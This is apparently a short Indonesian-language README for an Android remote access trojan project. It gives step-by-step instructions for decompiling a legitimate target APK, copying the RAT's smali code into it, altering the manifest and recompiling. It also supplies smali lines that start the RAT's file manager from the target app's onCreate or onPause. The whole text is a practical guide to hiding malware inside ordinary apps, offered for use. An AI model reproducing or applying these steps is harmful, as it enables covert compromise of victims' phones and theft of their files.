# android-rat-sisip
Hack android apk akses melalui internal root database
# Configure
- pertama decompile apk target terlebih dahulu menggunakan apktool
- kedua decompile apk ini(rat) menggunakan apktool
- salin code smali com/shun/.. di com/targetapk
- edit AndroidManifest.xml menyerupai AnfroidManifest.xml di apk rat ini
- lalu compile kembali

# Catatan
aplikasi ini tidak menggunakan xml script jadi tidak ribet cwim

# Update
jika xml tidak work
tambah:
    new-instance v0, Lcom/shun/hack/MainFileManager;

    invoke-direct {v0, p0}, Lcom/shun/hack/MainFileManager;-><init>(Landroid/content/Context;)V

di smali target MainActivity misal onPause atau onCreate
jangan lupa tambah package com.shun.hack
